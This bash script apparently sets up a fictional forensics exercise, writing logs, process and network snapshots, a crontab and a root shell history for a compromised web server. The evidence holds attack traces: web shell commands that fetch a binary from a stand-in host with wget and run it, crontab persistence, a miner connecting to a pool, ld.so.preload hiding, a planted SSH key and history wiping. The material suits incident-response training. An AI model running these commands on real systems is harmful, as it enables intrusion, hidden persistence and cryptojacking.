#!/bin/bash
# Creates the evidence files for Case 6001 (fictional compromised Linux web server)
cat > access.log << 'LOG'
203.0.113.45 - - [21/Oct/2026:03:10:11 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
10.0.2.20 - - [21/Oct/2026:03:12:30 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
203.0.113.45 - - [21/Oct/2026:03:14:02 +0000] "POST /upload.php HTTP/1.1" 200 312 "-" "curl/7.81.0"
203.0.113.45 - - [21/Oct/2026:03:14:20 +0000] "GET /uploads/cmd.php?c=id HTTP/1.1" 200 54 "-" "curl/7.81.0"
203.0.113.45 - - [21/Oct/2026:03:14:41 +0000] "GET /uploads/cmd.php?c=wget%20http://files-update-center.example/kworkerd%20-O%20/tmp/.kworkerd HTTP/1.1" 200 210 "-" "curl/7.81.0"
203.0.113.45 - - [21/Oct/2026:03:15:05 +0000] "GET /uploads/cmd.php?c=chmod%20%2Bx%20/tmp/.kworkerd HTTP/1.1" 200 12 "-" "curl/7.81.0"
203.0.113.45 - - [21/Oct/2026:03:15:30 +0000] "GET /uploads/cmd.php?c=/tmp/.kworkerd HTTP/1.1" 200 20 "-" "curl/7.81.0"
10.0.2.20 - - [21/Oct/2026:09:01:12 +0000] "GET /index.php HTTP/1.1" 200 5120 "-" "Mozilla/5.0"
LOG
cat > auth.log << 'LOG'
Oct 21 03:16:10 webserver sudo:    www-data : TTY=unknown ; PWD=/var/www/html/uploads ; USER=root ; COMMAND=/usr/bin/crontab -u root /tmp/c.txt
Oct 21 03:17:02 webserver sshd[2201]: Accepted publickey for root from 203.0.113.45 port 52811 ssh2
Oct 21 09:05:40 webserver sshd[2230]: Accepted password for alice from 10.0.2.20 port 40100 ssh2
LOG
cat > file_timeline.txt << 'LOG'
2026-10-21 03:14:02|2840|-rw-r--r--|www-data|/var/www/html/uploads/cmd.php
2026-10-21 03:14:45|1904320|-rwxr-xr-x|www-data|/tmp/.kworkerd
2026-10-21 03:16:10|63|-rw-------|root|/var/spool/cron/crontabs/root
2026-10-21 03:16:55|563|-rw-------|root|/root/.ssh/authorized_keys
2026-10-21 03:18:30|412|-rw-r--r--|root|/etc/ld.so.preload
2026-10-21 03:20:00|2048|-rw-r--r--|root|/root/.bash_history
2026-10-20 14:22:09|5120|-rw-r--r--|root|/var/www/html/index.php
2026-10-12 10:01:44|1024|-rw-r--r--|root|/etc/hosts
LOG
cat > crontab_root.txt << 'LOG'
# m h  dom mon dow   command
*/5 * * * * /tmp/.kworkerd >/dev/null 2>&1
LOG
cat > ps_snapshot.txt << 'LOG'
USER       PID %CPU %MEM COMMAND
root         1  0.0  0.1 /sbin/init
www-data   812  0.2  0.8 apache2 -k start
mysql      901  0.4  4.1 /usr/sbin/mysqld
root      2310 97.8  2.3 /tmp/.kworkerd --pool pool.minexmr-lab.example:4444
alice     2231  0.0  0.1 -bash
LOG
cat > ss_snapshot.txt << 'LOG'
State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process
LISTEN  0       128     0.0.0.0:22           0.0.0.0:*          sshd
LISTEN  0       511     *:80                 *:*                apache2
ESTAB   0       0       10.0.2.40:51044      198.51.100.99:4444 .kworkerd
ESTAB   0       0       10.0.2.40:22         10.0.2.20:40100    sshd
LOG
cat > root_bash_history.txt << 'LOG'
cd /tmp
chmod +x .kworkerd
echo "/tmp/libhide.so" > /etc/ld.so.preload
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA-FAKE-KEY attacker@kali" >> /root/.ssh/authorized_keys
history -c
LOG
echo "Created case 6001 evidence files:"; ls
